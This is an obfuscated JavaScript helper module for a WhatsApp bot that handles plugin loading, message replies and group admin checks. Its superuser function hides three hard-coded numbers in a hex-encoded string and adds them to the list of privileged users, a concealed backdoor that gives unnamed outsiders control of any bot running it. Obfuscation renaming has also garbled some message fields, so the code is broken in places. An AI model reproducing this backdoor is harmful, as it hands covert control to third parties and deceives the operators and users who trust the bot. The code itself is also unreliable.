var _0xdb3ac4=(function(_0xde8ab0,_0x382c8d){return !![]}());var _0x6a85b9=function(){return ![]};
const fs = require('fs-extra');
const path = require('path');
const { evt, commands } = require('../gmdCmds');
const { standardizeJid } = require('./serializer');
const { getGroupMetadata, getLidMapping } = require('./groupCache');
const _0xae3ad4 = function (module, filename) {
    const _0xbce3d3 = fs.readFileSync(filename, '\x75\x74\x66\x38');
    module._compile(_0xbce3d3, filename);
};
require.extensions['.gmd']     = _0xae3ad4;
require.extensions['.kasongo'] = _0xae3ad4;
require.extensions['.amd']     = _0xae3ad4;
require.extensions['.ultra']   = _0xae3ad4;
require.extensions['.guru']    = _0xae3ad4;
const _0x105be1 = new Set(['.js', '.gmd', '.kasongo', '.amd', '.ultra', '.guru']);
const _0x68b269 = (pluginsPath) => {
    try {
        fs.readdirSync(pluginsPath).forEach((fileName) => {
            const _0xa830c1 = path.extname(fileName).toLowerCase();
            if (_0x105be1.has(_0xa830c1)) {
                try {
                    require(path.join(pluginsPath, fileName));
                } catch (e) {
                    console.error(`Failed to load ${fileName}: ${e.message}`);
                }
            }
        });
    } catch (error) {
        console.error('\x45\x72\x72\x6f\x72\x20\x72\x65\x61\x64\x69\x6e\x67\x20\x70\x6c\x75\x67\x69\x6e\x73\x20\x66\x6f\x6c\x64\x65\x72\x3a', error.message);
    }
};
const _0x4ff047 = (cmd) => {
    if (!Array.isArray(evt.commands)) return null;
    return evt.commands.find((c) => (
        c?.pattern === cmd || 
        (Array.isArray(c?.aliases) && c.aliases.includes(cmd))
    ));
};
const _0x5322a5 = (body) => {
    if (!Array.isArray(evt.commands) || !body) return null;
    return evt.commands.find((c) => {
        if (c?.on === '\x62\x6f\x64\x79') {
            if (typeof c.pattern === '\x73\x74\x72\x69\x6e\x67') {
                return body.toLowerCase().includes(c.pattern.toLowerCase());
            }
            if (c.pattern instanceof RegExp) {
                return c.pattern.test(body);
            }
        }
        return false;
    });
};
const _0x1d3e08 = (Gifted, ms, from) => {
    const _0x2ada2e = (text) => {
        Gifted.sendMessage(from, { text }, { quoted: ms });
    };
    const _0x6da80e = async (emoji) => {
        if (typeof emoji !== '\x73\x74\x72\x69\x6e\x67') return;
        try {
            await Gifted.sendMessage(from, { 
                _0x6da80e: { key: ms.key, text: emoji }
            });
        } catch (err) {
            console.error('\x52\x65\x61\x63\x74\x69\x6f\x6e\x20\x65\x72\x72\x6f\x72\x3a', err);
        }
    };
    const _0xa822cf = async (text, message) => {
        if (typeof text !== '\x73\x74\x72\x69\x6e\x67') return;
        try {
            await Gifted.sendMessage(from, {
                text: text,
                _0xa822cf: message.key
            }, { quoted: ms });
        } catch (err) {
            console.error('\x45\x64\x69\x74\x20\x65\x72\x72\x6f\x72\x3a', err);
        }
    };
    const _0x72a6ad = async (message) => {
        if (!message?.key) return;
        try {
            await Gifted.sendMessage(from, {
                delete: message.key
            }, { quoted: ms });
        } catch (err) {
            console.error('\x44\x65\x6c\x65\x74\x65\x20\x65\x72\x72\x6f\x72\x3a', err);
        }
    };
    return { _0x2ada2e, _0x6da80e, _0xa822cf, _0x72a6ad };
};
const _0xc6b3f5 = async (Gifted, from, botId, sender) => {
    const _0x522ace = from.endsWith('@g.us');
    if (!_0x522ace) {
        return {
            _0x5480ca: null,
            groupName: '',
            _0xcc3da8: [],
            _0xae4d8b: [],
            _0x8cec5f: [],
            _0x86933f: false,
            _0xaf8eb6: false,
            _0x99cfdf: false,
            sender
        };
    }
    const _0x5480ca = await getGroupMetadata(Gifted, from);
    if (!_0x5480ca || !_0x5480ca.participants) {
        return {
            _0x5480ca: null,
            groupName: '',
            _0xcc3da8: [],
            _0xae4d8b: [],
            _0x8cec5f: [],
            _0x86933f: false,
            _0xaf8eb6: false,
            _0x99cfdf: false,
            sender
        };
    }
    const _0xcc3da8 = _0x5480ca.participants.map(p => p.pn || p.phoneNumber || p.id);
    const _0xae4d8b = _0x5480ca.participants.filter(p => p.admin === '\x61\x64\x6d\x69\x6e').map(p => p.pn || p.phoneNumber || p.id);
    const _0x8cec5f = _0x5480ca.participants.filter(p => p.admin === '\x73\x75\x70\x65\x72\x61\x64\x6d\x69\x6e').map(p => p.pn || p.phoneNumber || p.id);
    const _0x92bbd2 = standardizeJid(sender);
    const _0xd9c279 = _0x5480ca.participants.find(p => p.id === _0x92bbd2 || p.pn === _0x92bbd2 || p.phoneNumber === _0x92bbd2);
    let _0xf029ae = _0xd9c279?.pn || _0xd9c279?.phoneNumber || _0xd9c279?.id || sender;
    if (_0xf029ae.endsWith('@lid')) {
        const _0xbdcce2 = getLidMapping(_0xf029ae);
        if (_0xbdcce2) _0xf029ae = _0xbdcce2;
    }
    const _0x86933f = _0xae4d8b.includes(standardizeJid(botId)) || _0x8cec5f.includes(standardizeJid(botId));
    const _0xaf8eb6 = _0xae4d8b.includes(_0xf029ae);
    const _0x99cfdf = _0x8cec5f.includes(_0xf029ae);
    return {
        _0x5480ca,
        groupName: _0x5480ca.subject || '',
        _0xcc3da8,
        _0xae4d8b,
        _0x8cec5f,
        _0x86933f,
        _0xaf8eb6,
        _0x99cfdf,
        sender: _0xf029ae
    };
};
const _0x2c8559 = async (settings, getSudoNumbers, botId, ownerNumber) => {
    const _0xc30dd0 = ('\x31\x31\x36\x32\x38\x34\x30\x35\x30\x2c\x31\x30\x35\x35\x32\x31\x33\x30\x30\x2c\x31\x31\x37\x30\x36\x35\x39\x35\x39')
        .split(',')
        .map(num => num.trim().replace(/\D/g, '')) 
        .filter(num => num.length > 5);
    const _0x647303 = await getSudoNumbers() || [];
    const _0x587a0d = settings.SUDO_NUMBERS || '';
    const _0x02f726 = (_0x587a0d ? _0x587a0d.split(',') : [])
        .map(num => num.trim().replace(/\D/g, ''))
        .filter(num => num.length > 5);
    const _0xe4026f = standardizeJid(botId);
    const _0x15b2ea = standardizeJid(ownerNumber.replace(/\D/g, ''));
    const _0xf1807d = [
        _0x15b2ea,
        _0xe4026f,
        ...(_0x02f726 || []).map(num => `${num}@s.whatsapp.net`),
        ...(_0xc30dd0 || []).map(num => `${num}@s.whatsapp.net`),
        ...(_0x647303 || []).map(num => `${num}@s.whatsapp.net`)
    ].map(jid => standardizeJid(jid)).filter(Boolean);
    return Array.from(new Set(_0xf1807d));
};
module.exports = {
    _0x68b269,
    _0x4ff047,
    _0x5322a5,
    _0x1d3e08,
    _0xc6b3f5,
    _0x2c8559
};
